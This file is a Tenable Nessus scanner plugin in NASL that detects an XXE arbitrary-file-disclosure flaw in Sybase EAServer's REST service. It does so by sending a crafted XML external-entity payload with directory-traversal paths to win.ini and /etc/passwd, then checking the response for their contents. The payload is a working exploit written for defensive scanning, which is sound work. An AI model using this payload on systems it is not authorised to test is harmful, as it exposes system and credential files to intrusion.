#%NASL_MIN_LEVEL 70300
#
# (C) Tenable Network Security, Inc.
#

include('deprecated_nasl_level.inc');
include('compat.inc');

if (description)
{
  script_id(69171);
  script_version("1.13");
  script_set_attribute(attribute:"plugin_modification_date", value:"2021/06/03");

  script_bugtraq_id(60614, 61358);
  script_xref(name:"EDB-ID", value:"27011");
  script_xref(name:"IAVA", value:"2013-A-0123-S");

  script_name(english:"Sybase EAServer XML External Entity (XXE) Arbitrary File Disclosure");
  script_summary(english:"Tries to get contents of a file.");

  script_set_attribute(attribute:"synopsis", value:
"The remote Sybase install is affected by an arbitrary file disclosure
vulnerability.");
  script_set_attribute(attribute:"description", value:
"The remote Sybase EAServer install is affected by an arbitrary file
disclosure vulnerability.  It is possible to view any file on the system
by utilizing XML external entity injection in specially crafted XML data
sent to the REST service on the remote host. 

Note that hosts that are affected by this vulnerability are potentially
affected by other vulnerabilities that Nessus has not tested for.");
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20130719-0_Sybase_Application_Server_Multiple_Vulnerabilities_v10.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a6e04211");
  script_set_attribute(attribute:"see_also", value:"http://www.sybase.com/detail?id=1099353");
  script_set_attribute(attribute:"solution", value:"Apply the appropriate patch per the vendor's advisory.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:N/A:N");
  script_set_attribute(attribute:"cvss_score_source", value:"manual");
  script_set_attribute(attribute:"cvss_score_rationale", value:"information disclosure");

  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/07/17");
  script_set_attribute(attribute:"patch_publication_date", value:"2013/07/17");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:sybase:easerver");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_set_attribute(attribute:"stig_severity", value:"I");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2021 and is owned by Tenable, Inc. or an Affiliate thereof.");

  script_dependencies("sybase_easerver_detect.nasl");
  script_require_keys("www/sybase_easerver");
  script_require_ports("Services/www", 8000, 8001);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("webapp_func.inc");
include("http.inc");
include("data_protection.inc");

get_kb_item_or_exit("www/sybase_easerver");

port = get_http_port(default:8000);
install = get_install_from_kb(appname:'sybase_easerver', port:port, exit_on_fail:TRUE);

dir = install['dir'];
report_url = build_url(port:port, qs:dir);

pathlist = make_list(
  # these directory traversal strings should work assuming the
  # sybase install is on the same drive as the windows install
  '../../../../../../../../../../../../windows/win.ini',
  '../../../../../../../../../../../../winnt/win.ini',
  # hard-coded paths we can try, since most people install
  # windows to c:
  'c:/windows/win.ini',
  'c:/winnt/win.ini',
  # *nix path
  '/etc/passwd'
);

# nb: xml response is easiest one to parse that returns
# the string contents of the requested file
if (strlen(dir) > 0)
{
  if (dir[strlen(dir) - 1] == '/')
    url = dir + 'rest/public/xml-1.0/testDataTypes';
  else url = dir + '/rest/public/xml-1.0/testDataTypes';
}
else url = '/rest/public/xml-1.0/testDataTypes';

vuln = FALSE;
filename = '';
contents = '';

foreach path (pathlist)
{
  postdata =
'<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///' + path + '">]>
<exploit>
<dt>
<stringValue>&xxe;</stringValue>
<booleanValue>0</booleanValue>
</dt>
</exploit>';

  res = http_send_recv3(
    method:'POST',
    item:url,
    data:postdata,
    content_type:'text/xml',
    port:port,
    exit_on_fail:TRUE
  );

  if (
    '<stringValue>' >< res[2] &&
    '<testDataTypesResponse>' >< res[2]
  )
  {
    contents = strstr(res[2],'<stringValue>') - strstr(res[2], '</stringValue>') - '<stringValue>';

    if (
      "(; for 16-bit app support" >< contents ||
      "[Fonts]" >< contents ||
      "[Extensions]" >< contents ||
      "[files]" >< contents ||
      "[mci extensions]" >< contents ||
      "[MCI Extensions.BAK]" >< contents ||
      "[Mail]" >< contents
    )
    {
       vuln = TRUE;
       filename = 'win.ini';
       break;
    }
    else if (contents =~ 'root:.*0:[01]:')
    {
       vuln = TRUE;
       filename = '/etc/passwd';
       break;
    }
  }
}

if (vuln)
{
  report = NULL;
  attach_file = NULL;
  output = NULL;
  req = http_last_sent_request();
  request = NULL;


  if (report_verbosity > 0)
  {
    report =
    '\n' + "Nessus was able to obtain the contents of '" + filename + "' with the" +
    '\n' + 'following request :' +
    '\n' +
    '\n' +
    crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
    chomp(req) + '\n' +
    crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';

    if (report_verbosity > 1)
    {
      output = data_protection::redact_etc_passwd(output:contents);
      attach_file = filename;
      request = make_list(req);
    }
  }
  security_report_v4(port:port,
                     extra:report,
                     severity:SECURITY_HOLE,
                     request:request,
                     file:attach_file,
                     output:output);

}
else audit(AUDIT_WEB_APP_NOT_AFFECTED, 'Sybase EAServer', report_url);
